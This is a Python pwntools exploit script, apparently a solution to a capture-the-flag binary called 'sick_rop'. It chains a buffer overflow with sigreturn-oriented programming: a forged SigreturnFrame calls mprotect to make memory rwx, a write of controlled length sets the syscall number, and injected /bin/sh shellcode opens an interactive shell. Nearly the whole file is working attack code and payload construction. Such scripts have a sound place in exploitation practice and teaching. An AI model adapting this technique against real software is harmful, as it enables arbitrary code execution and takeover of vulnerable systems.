import pathlib

from pwn import *

from utils.target import start

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'sick_rop'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

vuln_addr = 0x0040102e  # Addr of vuln function
vuln_ptr = 0x4010d8  # This memloc holds vuln_addr
syscall_ret_gadget_addr = 0x401014  # Addr of syscall + ret gadget
arbitrary_write_base_addr = 0x4010b8  # Addr of our arbitrary write

padding = bytearray(asm('nop') * 0x28)

# Syscall numbers
mprotect_syscall_no = 0xa
sigreturn_syscall_no = 0xf

# sigreturn frame payload abusing sigreturn syscall with userspace context frame
frame = SigreturnFrame()
frame.rax = mprotect_syscall_no
frame.rdi = 0x00401000  # mprotect address
frame.rsi = 0x00001000  # mprotect size
frame.rdx = 0x7  # mprotect prot (rwx)
frame.rsp = vuln_ptr  # Make sure we return to vuln after syscall
frame.rip = syscall_ret_gadget_addr
sigreturn_frame_payload = padding + p64(vuln_addr) + p64(syscall_ret_gadget_addr) + bytes(frame)

# mprotect syscall number payload (number of bytes written becomes syscall no)
mprotect_syscall_no_payload = b'!' * (sigreturn_syscall_no - 1)

# Shellcode payload
shellcode = asm(pwnlib.shellcraft.amd64.linux.sh())
shellcode_addr = arbitrary_write_base_addr + len(padding) + 0x8
shellcode_payload = padding + pack(shellcode_addr) + shellcode

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start(exe=str(exe), gdb_script=gdb_script)

info(f'Sending SROP payload...')
io.sendline(sigreturn_frame_payload)
io.recvuntil(sigreturn_frame_payload + b'\n')

info(f'Sending {sigreturn_syscall_no} garbage bytes to set syscall number...')
io.sendline(mprotect_syscall_no_payload)
io.recvuntil(mprotect_syscall_no_payload + b'\n')

info(f'Sending shellcode payload...')
io.sendline(shellcode_payload)
io.recvuntil(shellcode_payload + b'\n')

try:
    io.sendline(b'whoami')
    success(f'Exploit succeeded, welcome `{io.recvline(keepends=False).decode()}`')
    io.interactive()
    exit(0)
except EOFError or BrokenPipeError:
    pass

error(f'Exploit failed!')
